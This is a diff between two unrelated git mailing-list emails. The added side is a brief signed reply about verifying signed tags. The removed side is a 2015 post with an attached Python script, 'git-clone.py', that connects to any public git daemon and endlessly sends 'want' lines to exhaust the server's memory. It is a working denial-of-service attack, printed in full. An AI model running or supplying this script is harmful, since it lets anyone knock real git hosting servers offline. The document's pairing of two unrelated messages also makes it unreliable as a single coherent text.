@@ -1,126 +1,91 @@
-From: ytrezq@sdf-eu.org
-Subject: arbitrary memory allocation
-Date: Thu, 26 Nov 2015 05:06:35 +0100
-Message-ID: <1a012fc79a55cae8b948b28d1259be0c.squirrel@sdfeu.org>
-Reply-To: ytrezq@sdf-eu.org
+From: Stephen & Linda Smith <ischis2@cox.net>
+Subject: Re: Signed tags and git repository
+Date: Wed, 25 Nov 2015 22:07:36 -0700
+Message-ID: <3912454.5IyPOB72Zu@thunderbird>
+References: <3816223.3lD8Al3iuQ@thunderbird>
 Mime-Version: 1.0
-Content-Type: multipart/mixed;boundary="----=_20151126050635_37662"
-To: git@vger.kernel.org
-X-From: git-owner@vger.kernel.org Thu Nov 26 05:20:58 2015
+Content-Type: multipart/signed; boundary="nextPart7495607.fI08RMCs7y"; micalg="pgp-sha256"; protocol="application/pgp-signature"
+To: git@vger.kernel.org,
+	Johannes =?ISO-8859-1?Q?L=F6thberg?= <johannes@kyriasis.com>
+X-From: git-owner@vger.kernel.org Thu Nov 26 06:07:36 2015
 Return-path: <git-owner@vger.kernel.org>
 Envelope-to: gcvg-git-2@plane.gmane.org
 Received: from vger.kernel.org ([209.132.180.67])
 	by plane.gmane.org with esmtp (Exim 4.69)
 	(envelope-from <git-owner@vger.kernel.org>)
-	id 1a1o3F-0003Md-5S
-	for gcvg-git-2@plane.gmane.org; Thu, 26 Nov 2015 05:20:57 +0100
+	id 1a1omL-0001gi-Q2
+	for gcvg-git-2@plane.gmane.org; Thu, 26 Nov 2015 06:07:34 +0100
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1752322AbbKZEUt (ORCPT <rfc822;gcvg-git-2@m.gmane.org>);
-	Wed, 25 Nov 2015 23:20:49 -0500
-Received: from odin.sdf-eu.org ([178.63.35.194]:49705 "EHLO sdfeu.org"
-	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-	id S1752272AbbKZEUs (ORCPT <rfc822;git@vger.kernel.org>);
-	Wed, 25 Nov 2015 23:20:48 -0500
-X-Greylist: delayed 491 seconds by postgrey-1.27 at vger.kernel.org; Wed, 25 Nov 2015 23:20:48 EST
-Received: from sdfeu.org (IDENT:www@odin.sdf-eu.org [178.63.35.194])
-	by sdfeu.org (8.14.8/8.14.3) with ESMTP id tAQ46ZXH025661
-	for <git@vger.kernel.org>; Thu, 26 Nov 2015 04:06:35 GMT
-Received: from 24.41.74.86.rev.sfr.net ([86.74.41.24])
-        (SquirrelMail authenticated user ytrezq)
-        by sdfeu.org with HTTP;
-        Thu, 26 Nov 2015 05:06:35 +0100
-User-Agent: SquirrelMail/1.4.21
-X-Priority: 1 (Highest)
-Importance: High
+	id S1750786AbbKZFH2 (ORCPT <rfc822;gcvg-git-2@m.gmane.org>);
+	Thu, 26 Nov 2015 00:07:28 -0500
+Received: from fed1rmfepo201.cox.net ([68.230.241.146]:37794 "EHLO
+	fed1rmfepo201.cox.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1750711AbbKZFH0 (ORCPT <rfc822;git@vger.kernel.org>);
+	Thu, 26 Nov 2015 00:07:26 -0500
+Received: from fed1rmimpo109 ([68.230.241.158]) by fed1rmfepo201.cox.net
+          (InterMail vM.8.01.05.15 201-2260-151-145-20131218) with ESMTP
+          id <20151126050725.LDIR10284.fed1rmfepo201.cox.net@fed1rmimpo109>
+          for <git@vger.kernel.org>; Thu, 26 Nov 2015 00:07:25 -0500
+Received: from thunderbird ([68.231.74.134])
+	by fed1rmimpo109 with cox
+	id m57R1r0042tqoqC0157RBb; Thu, 26 Nov 2015 00:07:25 -0500
+X-CT-Class: Clean
+X-CT-Score: 0.00
+X-CT-RefID: str=0001.0A020204.5656938D.00F8,ss=1,re=0.000,fgs=0
+X-CT-Spam: 0
+X-Authority-Analysis: v=2.0 cv=AZNv6QrG c=1 sm=1
+ a=/Rt4pg3TtX3KzfzhvVoEow==:17 a=kviXuzpPAAAA:8 a=qtqOOiqGOCEA:10
+ a=CNC-ILQiZ6rS6a9m4bMA:9 a=wPNLvfGTeEIA:10 a=ACDOu9pH71MA:10
+ a=Eb5P3iG-Cg48dJb9:21 a=H49I5Zy6KP5tsp5r:21 a=8Ycc5uBOPi8OPSky6-QA:9
+ a=/Rt4pg3TtX3KzfzhvVoEow==:117
+X-CM-Score: 0.00
+Authentication-Results: cox.net; none
+Received: from thunderbird.localnet (thunderbird [127.0.0.1])
+	by thunderbird (Postfix) with ESMTP id 89C9913F66E;
+	Wed, 25 Nov 2015 22:07:36 -0700 (MST)
+User-Agent: KMail/5.0.2 (Linux/4.2.0-19-generic; KDE/5.15.0; x86_64; ; )
 Sender: git-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <git.vger.kernel.org>
 X-Mailing-List: git@vger.kernel.org
-Archived-At: <http://permalink.gmane.org/gmane.comp.version-control.git/281754>
+Archived-At: <http://permalink.gmane.org/gmane.comp.version-control.git/281755>
 
-------=_20151126050635_37662
+--nextPart7495607.fI08RMCs7y
+Content-Transfer-Encoding: quoted-printable
 Content-Type: text/plain; charset="iso-8859-1"
-Content-Transfer-Encoding: 8bit
 
-Hello,
+On Thursday, November 26, 2015 04:56:00 AM Johannes L=F6thberg wrote:
 
-First, something I still don t understand, should I always ulimit ram
-usage for security purposes when I m manage a public server?
+> You don't even need the Web of Trust though, you can just verify the=20
+> signature and then check that the key used to make the signature is the=20
+> correct one,=20
 
-If not, you may find the attachment interesting
-------=_20151126050635_37662
-Content-Type: text/x-python; name="git-clone.py"
-Content-Transfer-Encoding: 8bit
-Content-Disposition: attachment; filename="git-clone.py"
+Ok, but if I don't have a link to the Web or Trust, how do I know that "the
+key used to make sure the signature is the correct one" (i.e. trusted).
 
-#!/usr/bin/python
-from socket import *
-import sys,time
-if len(sys.argv)!=3:
-	print "Ok, it is not a real memory leak but it can be used against any public git server.\nAn http version of this script would benefit from a large zlib compression ratio allowing to fill the ram 200 time faster like with ssh"
-	print ""
-	print "usage"
-	print "argv1 is the target domain name or address"
-	print "argv2 is the path to a non empty repo with at least 2 refs"
-	print ""
-	print "for example git://somesite.com/git/linux.git would become"
-	print sys.argv[0] + " somesite.com /git/linux.git"
-	exit(1)
+sps
 
-sockobj = socket(AF_INET, SOCK_STREAM)
-sockobj.connect((sys.argv[1],9418))
-path="git-upload-pack "+sys.argv[2]+"\0host="+sys.argv[1]+'\0' # request a clone
-sockobj.send(format(len(path)+4,'04x')+path) # see the git documentation for more information about the pkt-line format
+--nextPart7495607.fI08RMCs7y
+Content-Type: application/pgp-signature; name="signature.asc"
+Content-Description: This is a digitally signed message part.
+Content-Transfer-Encoding: 7Bit
 
-# Even when blocking, socket.recv might not send the complete request size
-def full_read(length):
-	buf=sockobj.recv(length)
-	size=length-len(buf)
-	while size>0:
-		time.sleep(0.001) # wait for data to arrive
-		buf+=sockobj.recv(size)
-		size=size-len(buf)
-	return buf
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v2
 
-obj=[full_read(int(full_read(4),16)-4)]
-pkt_line_length=int(sockobj.recv(4),16)-4 # represent the lenght of a packet in pkt-line format (in hex on 4 ascii bytes)
-while pkt_line_length>0:
-	obj.append(full_read(pkt_line_length))
-	pkt_line_length=int(full_read(4),16)-4
-	if sys.getsizeof(obj)>150000: # Don t do the same error of the official git project, limit our ram usage
-		time.sleep(1)
-		sockobj.recv(10000) # be sure git-upload-pack would be ready for recieving
-		break
+iQIcBAABCAAGBQJWVpOYAAoJEBbmMR/e6CDNlQIP/R8BqCgw+VvAE2hXAFsK94f2
+o1Yyf7e03VQ4njTGZqBviFPU2l4QFxoKwzg5RI1z64ljlZBs9CCatyTBgdCCqXOi
+JGYgxO1UaP9qrbh/+GlMIgWcFHY9Og/vcf15mL/W2jNqMYsxvWuXCc6T+iaE/uBM
+N75uaSqSDdZA8rS6wRESEhMrzkrE4M7Gar/5kKZlA+640hK5lfumLRAlwMZiz/5j
+qxfVg2QlsojmYNfwjVkhDZwf240J+8lpG1Ad4JzuAHYLZty2elcTh8g1C6FeEMx/
+b0jYgiPRoMQ0/sGls7251u47CEfV1AjfQjYpJNx6peP9aJIoL7EjsDdHGOpy9YP+
+wqV/RaFWFRb8RPvSZpaJQEnKwKZVI0hR6TcAZoOdupvRwcia95JSZI3QTh1Hlsr4
+0vSmBkxSELMNV16PgljrA1LXd4OPznhrM3bL7l9CclWFCnAY+7/7q4zNUpIU2SHk
+E+I3TPDIJp+42+2pjAlfHdlMVOnhztwvaHrDbJV4KB4EizV9Jp2BgsXURsRZKa/H
+h8Ud0++CQjgXcY5uMAqCgmtJ4Fr/YQ0wp1POPBPYHDP8RZSYdV/5e099i/LEC3pW
+lGP4+nC7DZuZJYEwbiDGy0HW5cjhfCY+4grAd1jZiE6HvKg/TWeksWBH9gVT07p2
+wwti6pZljl9buai91rTs
+=UAjH
+-----END PGP SIGNATURE-----
 
-first_line="want "+obj[0][:40]+" multi_ack_detailed side-band-64k thin-pack ofs-delta agent=git/2.9.2\n" # The first line have a different format
-sockobj.send(format(len(first_line)+4,'04x')+first_line) # send it in the pkt-line format
-
-line_list="0032want "+obj[1][:40]+'\n'
-while len(line_list)<65430: # Get the ideal tcp packet size for fastest bandwidth (64Ko)
-	for i in obj:
-		if (i==obj[0]) or (i==obj[1]) or ("pull" in i):
-			continue
-		line_list+="0032want "+i[:40]+'\n'
-		if len(line_list)>65480:
-			break
-
-
-# struct object (see object.h line 47)
-# unsigned int
-# unsigned int
-# unsigned int
-# unsigned int
-# unsigned char binary_sha[20]
-
-# objects=object +
-# char *=NULL (64 bit int)
-# char *=NULL (64 bit int)
-# unsigned mode
-line_list_len=line_list.count('\n')*56 # Line lengths of the pkt-line format won t fill the ram, so remove them from the size counter
-count=line_list_len
-while True:
-	sys.stdout.flush()
-	sockobj.send(line_list) # for each line, the git-send-pack process allocate append a member to a struct objects array
-	print("\r%.2f Mo of ram filled" % float(count/float(1048576))),
-	count+=line_list_len
-------=_20151126050635_37662--
+--nextPart7495607.fI08RMCs7y--
